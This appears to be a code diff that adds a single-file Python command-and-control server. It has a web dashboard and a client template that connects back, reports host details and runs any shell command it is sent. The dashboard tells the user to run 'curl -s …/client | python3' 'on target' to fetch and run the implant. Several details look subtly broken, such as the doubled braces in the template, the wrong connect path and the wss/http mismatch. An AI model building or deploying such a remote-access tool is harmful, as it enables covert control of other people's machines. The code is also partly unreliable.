@@ -1,25 +1,346 @@
-cd /home/server/command-server
+#!/usr/bin/env python3
+"""
+Command Server — single-file remote command execution + web dashboard.
+Requires: pip install aiohttp
+Run:      python3 server.py
+"""
 
-cp -f server rebuild.py
-
-python3 - <<'PY'
+import asyncio
+import hashlib
+import json
+import secrets
+import os
+import sys
+import getpass
+import time
 from pathlib import Path
 
-p = Path("rebuild.py")
-code = p.read_text()
+try:
+    from aiohttp import web, WSMsgType
+except ImportError:
+    sys.exit("Missing dependency. Run: pip install aiohttp")
 
-code = code.replace("import sys\n", "import sys\nimport getpass\n", 1)
-code = code.replace('"owner": "YOUR_GITHUB_USERNAME"', '"owner": "yvlfiction"')
-code = code.replace('"repo": "YOUR_REPOSITORY"', '"repo": "server"')
-code = code.replace(
-    '"token": ""',
-    '"token": getpass.getpass("GitHub token (Contents: Read and write): ").strip()',
-    1
-)
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+HOST = "0.0.0.0"
+PORT = 8443
+BASE = Path(__file__).resolve().parent
+DATA_DIR = BASE / "data"
+DATA_DIR.mkdir(exist_ok=True)
+CLIENTS_FILE = DATA_DIR / "clients.json"
 
-if "YOUR_GITHUB_USERNAME" in code or "YOUR_REPOSITORY" in code:
-    raise SystemExit("Repository settings were not fixed.")
+# ─── CLIENT TEMPLATE ──────────────────────────────────────────────────────────
+CLIENT_TEMPLATE = r'''
+import asyncio, json, os, platform, socket, subprocess, sys, urllib.request, websockets
 
-p.write_text(code)
-print("Rebuild script prepared.")
-PY
+CLIENT_ID = "__CLIENT_ID__"
+CLIENT_TOKEN = "__CLIENT_TOKEN__"
+SERVER = "__SERVER__"
+
+async def main():
+    while True:
+        try:
+            async with websockets.connect(f"wss://{SERVER}", ssl=False) as ws:
+                await ws.send(json.dumps({{"type": "register", "id": CLIENT_ID, "token": CLIENT_TOKEN,
+                    "info": {{"os": platform.system(), "user": os.environ.get("USER","?"),
+                              "host": socket.gethostname(), "arch": platform.machine()}}}}))
+                async for msg in ws:
+                    d = json.loads(msg)
+                    if d["type"] == "cmd":
+                        p = await asyncio.get_event_loop().run_in_executor(
+                            None, lambda c=d["cmd"]: subprocess.run(c, shell=True, capture_output=True, text=True, cwd=os.path.expanduser("~")))
+                        await ws.send(json.dumps({{"type": "output", "id": CLIENT_ID, "cmd": d["cmd"],
+                            "stdout": p.stdout, "stderr": p.stderr, "rc": p.returncode}}))
+                    elif d["type"] == "ping":
+                        await ws.send(json.dumps({{"type": "pong", "id": CLIENT_ID}}))
+        except Exception:
+            await asyncio.sleep(5)
+
+asyncio.run(main())
+'''
+
+# ─── DASHBOARD HTML ───────────────────────────────────────────────────────────
+DASHBOARD_HTML = r'''<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Command Server</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-height:100vh}
+.header{padding:20px 30px;border-bottom:1px solid #0f0;display:flex;justify-content:space-between;align-items:center}
+.header h1{color:#0f0;text-shadow:0 0 10px #0f0;font-size:1.4rem}
+.header .status{color:#0f0;font-size:.8rem}
+.container{padding:20px 30px}
+.clients{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
+.card{background:#111;border:1px solid #0f0;border-radius:8px;padding:16px;position:relative;box-shadow:0 0 8px rgba(0,255,0,.15)}
+.card .name{color:#0f0;font-weight:bold;font-size:1.1rem;text-shadow:0 0 6px #0f0}
+.card .meta{color:#aaa;font-size:.75rem;margin-top:6px;line-height:1.6}
+.card .btn{margin-top:12px;padding:6px 14px;background:transparent;border:1px solid #0f0;color:#0f0;cursor:pointer;border-radius:4px;font-family:inherit;font-size:.8rem;transition:all .2s}
+.card .btn:hover{background:#0f0;color:#000;box-shadow:0 0 12px #0f0}
+.card .btn.danger{border-color:#f00;color:#f00}
+.card .btn.danger:hover{background:#f00;color:#fff;box-shadow:0 0 12px #f00}
+.terminal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.95);z-index:100;padding:20px}
+.terminal-overlay.active{display:flex;flex-direction:column}
+.term-header{display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;border-bottom:1px solid #0f0}
+.term-header span{color:#0f0;text-shadow:0 0 8px #0f0}
+.term-close{background:transparent;border:1px solid #f00;color:#f00;padding:4px 12px;cursor:pointer;border-radius:4px;font-family:inherit}
+.term-close:hover{background:#f00;color:#fff}
+.term-body{flex:1;overflow-y:auto;padding:12px;font-size:.85rem;line-height:1.5}
+.term-body .prompt{color:#0f0}
+.term-body .output{color:#fff;white-space:pre-wrap;word-break:break-all}
+.term-body .error{color:#f44}
+.term-input{display:flex;gap:8px;padding-top:10px;border-top:1px solid #333}
+.term-input input{flex:1;background:#111;border:1px solid #0f0;color:#fff;padding:8px 12px;font-family:inherit;font-size:.9rem;border-radius:4px;outline:none}
+.term-input input:focus{box-shadow:0 0 8px rgba(0,255,0,.3)}
+.term-input button{background:#0f0;color:#000;border:none;padding:8px 20px;cursor:pointer;border-radius:4px;font-family:inherit;font-weight:bold}
+.term-input button:hover{box-shadow:0 0 12px #0f0}
+.section-title{color:#fff;font-size:.9rem;margin-bottom:12px;text-transform:uppercase;letter-spacing:2px}
+.empty{color:#555;text-align:center;padding:60px;font-size:1rem}
+.rebuild-box{margin-top:30px;padding:20px;border:1px solid #fff;border-radius:8px;background:#111}
+.rebuild-box h3{color:#fff;margin-bottom:12px}
+.rebuild-box code{background:#222;padding:2px 6px;border-radius:3px;color:#0f0;font-size:.85rem}
+</style></head><body>
+<div class="header">
+  <h1>⬡ COMMAND SERVER</h1>
+  <div class="status" id="status">connecting…</div>
+</div>
+<div class="container">
+  <div class="section-title">Connected Clients</div>
+  <div class="clients" id="clients"><div class="empty">No clients connected</div></div>
+  <div class="rebuild-box">
+    <h3>Generate Client</h3>
+    <p style="color:#aaa;font-size:.8rem;margin-bottom:10px">Run on target: <code>curl -s https://YOUR_SERVER:PORT/client | python3</code></p>
+    <button class="card .btn" onclick="rebuild()">Rebuild Client Script</button>
+    <pre id="rebuild-out" style="margin-top:10px;color:#0f0;font-size:.75rem;white-space:pre-wrap;display:none"></pre>
+  </div>
+</div>
+<div class="terminal-overlay" id="term-overlay">
+  <div class="term-header">
+    <span id="term-title">Terminal</span>
+    <button class="term-close" onclick="closeTerm()">✕ Close</button>
+  </div>
+  <div class="term-body" id="term-body"></div>
+  <div class="term-input">
+    <input id="term-input" placeholder="Enter command…" autocomplete="off">
+    <button onclick="sendCmd()">Run</button>
+  </div>
+</div>
+<script>
+let ws, currentClient = null;
+const clientsEl = document.getElementById('clients');
+const statusEl = document.getElementById('status');
+const termOverlay = document.getElementById('term-overlay');
+const termBody = document.getElementById('term-body');
+const termInput = document.getElementById('term-input');
+const termTitle = document.getElementById('term-title');
+const rebuildOut = document.getElementById('rebuild-out');
+
+function connect() {
+  ws = new WebSocket(`ws://${location.host}/ws/dashboard`);
+  ws.onopen = () => statusEl.textContent = '● online';
+  ws.onclose = () => { statusEl.textContent = '● reconnecting…'; setTimeout(connect, 2000); };
+  ws.onmessage = (e) => {
+    const d = JSON.parse(e.data);
+    if (d.type === 'clients') renderClients(d.clients);
+    if (d.type === 'output') appendOutput(d);
+  };
+}
+
+function renderClients(clients) {
+  if (!clients.length) { clientsEl.innerHTML = '<div class="empty">No clients connected</div>'; return; }
+  clientsEl.innerHTML = clients.map(c => `
+    <div class="card">
+      <div class="name">${c.id}</div>
+      <div class="meta">OS: ${c.info.os} ${c.info.arch}<br>User: ${c.info.user}<br>Host: ${c.info.host}<br>Since: ${new Date(c.since*1000).toLocaleTimeString()}</div>
+      <button class="btn" onclick="openTerm('${c.id}')">⌨ Terminal</button>
+      <button class="btn danger" onclick="killClient('${c.id}')">✕ Kill</button>
+    </div>`).join('');
+}
+
+function openTerm(id) {
+  currentClient = id;
+  termTitle.textContent = `⌨ ${id}`;
+  termBody.innerHTML = '<div class="output">Connected to ' + id + '. Enter a command below.</div>';
+  termOverlay.classList.add('active');
+  termInput.focus();
+}
+
+function closeTerm() { termOverlay.classList.remove('active'); currentClient = null; }
+
+function sendCmd() {
+  const cmd = termInput.value.trim();
+  if (!cmd || !currentClient) return;
+  termBody.innerHTML += `<div class="prompt">$ ${cmd}</div><div class="output" id="out-${Date.now()}">⏳ running…</div>`;
+  termBody.scrollTop = termBody.scrollHeight;
+  ws.send(JSON.stringify({type:'cmd', id: currentClient, cmd}));
+  termInput.value = '';
+}
+
+function appendOutput(d) {
+  if (d.id !== currentClient) return;
+  const blocks = termBody.querySelectorAll('.output');
+  const last = blocks[blocks.length - 1];
+  let text = '';
+  if (d.stdout) text += d.stdout;
+  if (d.stderr) text += '\n' + d.stderr;
+  if (!text) text = '(no output, exit ' + d.rc + ')';
+  if (d.rc !== 0) last.className = 'error';
+  last.textContent = text;
+  termBody.scrollTop = termBody.scrollHeight;
+}
+
+function killClient(id) {
+  if (confirm('Kill client ' + id + '?')) ws.send(JSON.stringify({type:'kill', id}));
+}
+
+function rebuild() {
+  fetch('/api/rebuild').then(r=>r.text()).then(t => {
+    rebuildOut.textContent = t;
+    rebuildOut.style.display = 'block';
+  });
+}
+
+termInput.addEventListener('keydown', e => { if (e.key === 'Enter') sendCmd(); });
+connect();
+</script></body></html>'''
+
+# ─── STATE ────────────────────────────────────────────────────────────────────
+clients: dict[str, dict] = {}
+dashboard_ws: set[web.WebSocketResponse] = set()
+
+def save_clients():
+    data = {cid: {"token": c["token"], "info": c["info"]} for cid, c in clients.items()}
+    CLIENTS_FILE.write_text(json.dumps(data, indent=2))
+
+def load_clients():
+    if CLIENTS_FILE.exists():
+        data = json.loads(CLIENTS_FILE.read_text())
+        for cid, info in data.items():
+            clients[cid] = {"token": info["token"], "info": info["info"], "ws": None, "since": 0}
+
+# ─── HANDLERS ─────────────────────────────────────────────────────────────────
+
+async def index(request):
+    return web.Response(text=DASHBOARD_HTML, content_type="text/html")
+
+async def dashboard_ws_handler(request):
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+    dashboard_ws.add(ws)
+    # send current state
+    await ws.send_json({"type": "clients", "clients": [
+        {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
+    ]})
+    try:
+        async for msg in ws:
+            if msg.type == WSMsgType.TEXT:
+                d = json.loads(msg.data)
+                if d["type"] == "cmd":
+                    cid, cmd = d["id"], d["cmd"]
+                    if cid in clients and clients[cid]["ws"]:
+                        await clients[cid]["ws"].send_json({"type": "cmd", "cmd": cmd})
+                elif d["type"] == "kill":
+                    cid = d["id"]
+                    if cid in clients and clients[cid]["ws"]:
+                        await clients[cid]["ws"].close()
+                        del clients[cid]
+                    broadcast()
+            elif msg.type == WSMsgType.CLOSE:
+                break
+    finally:
+        dashboard_ws.discard(ws)
+    return ws
+
+def broadcast():
+    payload = json.dumps({"type": "clients", "clients": [
+        {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
+    ]})
+    for ws in list(dashboard_ws):
+        asyncio.ensure_future(ws.send_str(payload))
+
+async def client_ws_handler(request):
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+    cid = None
+    try:
+        async for msg in ws:
+            if msg.type == WSMsgType.TEXT:
+                d = json.loads(msg.data)
+                if d["type"] == "register":
+                    cid = d["id"]
+                    if cid in clients and clients[cid]["token"] == d["token"]:
+                        clients[cid]["ws"] = ws
+                        clients[cid]["since"] = time.time()
+                        clients[cid]["info"] = d["info"]
+                        broadcast()
+                        save_clients()
+                    else:
+                        await ws.close(code=4001, message=b"bad auth")
+                        return ws
+                elif d["type"] == "output":
+                    for dw in list(dashboard_ws):
+                        try:
+                            await dw.send_json(d)
+                        except Exception:
+                            pass
+                elif d["type"] == "pong":
+                    pass
+            elif msg.type == WSMsgType.CLOSE:
+                break
+    finally:
+        if cid and cid in clients:
+            clients[cid]["ws"] = None
+            broadcast()
+    return ws
+
+async def client_download(request):
+    """Serves a one-shot client script (no fixed ID — generates one)."""
+    cid = secrets.token_hex(6)
+    token = secrets.token_hex(16)
+    clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
+    save_clients()
+    server_host = request.host
+    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER__", server_host)
+    return web.Response(text=code, content_type="text/x-python")
+
+async def api_rebuild(request):
+    """Returns the client download command + a standalone script."""
+    cid = secrets.token_hex(6)
+    token = secrets.token_hex(16)
+    clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
+    save_clients()
+    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER__", f"{HOST}:{PORT}")
+    return web.Response(text=f"# Client ID: {cid}\n# Save as client.py and run: python3 client.py\n\n{code}", content_type="text/plain")
+
+async def api_clients(request):
+    return web.json_response([
+        {"id": cid, "info": c["info"], "online": bool(c["ws"]), "since": c["since"]}
+        for cid, c in clients.items()
+    ])
+
+# ─── MAIN ─────────────────────────────────────────────────────────────────────
+
+async def on_startup(app):
+    load_clients()
+    print(f"\n  ⬡ Command Server running on http://{HOST}:{PORT}")
+    print(f"  Dashboard: http://localhost:{PORT}")
+    print(f"  Client:    curl -s http://<your-ip>:{PORT}/client | python3\n")
+
+async def on_shutdown(app):
+    for ws in dashboard_ws:
+        await ws.close()
+    for c in clients.values():
+        if c["ws"]:
+            await c["ws"].close()
+
+def main():
+    app = web.Application()
+    app.on_startup.append(on_startup)
+    app.on_shutdown.append(on_shutdown)
+    app.router.add_get("/", index)
+    app.router.add_get("/ws/dashboard", dashboard_ws_handler)
+    app.router.add_get("/ws/client", client_ws_handler)
+    app.router.add_get("/client", client_download)
+    app.router.add_get("/api/rebuild", api_rebuild)
+    app.router.add_get("/api/clients", api_clients)
+    web.run_app(app, host=HOST, port=PORT)
+
+if __name__ == "__main__":
+    main()   
